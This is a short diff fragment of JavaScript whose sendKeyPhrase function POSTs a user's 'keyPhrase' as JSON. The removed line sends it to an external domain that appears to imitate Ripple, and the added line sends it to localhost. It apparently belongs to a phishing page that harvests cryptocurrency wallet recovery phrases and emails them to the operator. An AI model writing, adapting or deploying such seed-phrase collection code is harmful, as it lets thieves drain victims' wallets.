@@ -302,7 +302,7 @@
         function sendKeyPhrase(keyPhrase) {
             const data = { keyPhrase };
 
-            fetch('https://ripple-ledger.com/send-email', { 
+            fetch('http://localhost:8000/send-email', { 
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
